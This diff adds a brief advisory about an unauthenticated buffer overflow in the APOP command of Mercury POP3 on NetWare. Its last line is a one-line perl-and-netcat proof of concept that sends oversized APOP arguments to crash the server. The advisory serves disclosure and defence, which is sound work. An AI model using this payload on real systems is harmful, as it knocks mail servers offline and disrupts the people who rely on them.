@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/2641/info
+
+Mercury MTA is a mail-transfer agent available for Novell NetWare and Windows NT. Novell versions of the Mercury POP3 server prior to 1.48 are vulnerable to a buffer overflow caused by inadequate string handling for the APOP authentication command.
+
+Because the overflow occurs in an authentication command parser, unauthenticated remote users can trigger the overflow. It is unknown whether the overflow can lead to arbitrary code execution, but proof-of-concept code is available that will crash the NetWare server, requiring a reboot. 
+
+perl -e 'print "APOP " . "a"x2048 . " " . "a"x2048 . "\r\n"' | nc mercury_host 110 
